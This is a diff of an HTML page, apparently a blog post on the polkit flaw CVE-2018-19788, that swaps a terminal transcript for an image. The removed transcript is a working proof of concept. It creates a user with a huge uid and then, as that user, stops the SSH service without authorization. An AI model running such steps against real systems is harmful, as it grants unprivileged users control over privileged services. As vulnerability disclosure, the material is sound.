@@ -91,27 +91,7 @@
 
 <p>Find out more about CVE-2018-19788 from the <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19788">MITRE CVE</a> dictionary and <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2018-19788">NIST NVD</a></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>root@ahihi:~# useradd -u 4000000000 wtf
-root@ahihi:~# su - wtf
-No directory, logging in with HOME=/
-
-$ whoami
-wtf
-$ id
-uid=4000000000(wtf) gid=1002(wtf) groups=1002(wtf)
-
-$ systemctl stop sshd.service
-
-(process:22860): GLib-GObject-WARNING **: value "-294967296" of type 'gint' is invalid or out of range for property 'uid' of type 'gint'
-**
-ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid (POLKIT_UNIX_PROCESS (subject)) &gt;= 0)
-
-root@ahihi:~# systemctl status sshd.service
-...
-Dec 05 15:38:39 ahihi systemd[1]: Stopping OpenBSD Secure Shell server...
-Dec 05 15:38:39 ahihi systemd[1]: Stopped OpenBSD Secure Shell server.
-</code></pre>
-</div>
+<p><img src="/assets/img/CVE-2018-19788.webp" alt="" /></p>
 
  
             </p> 
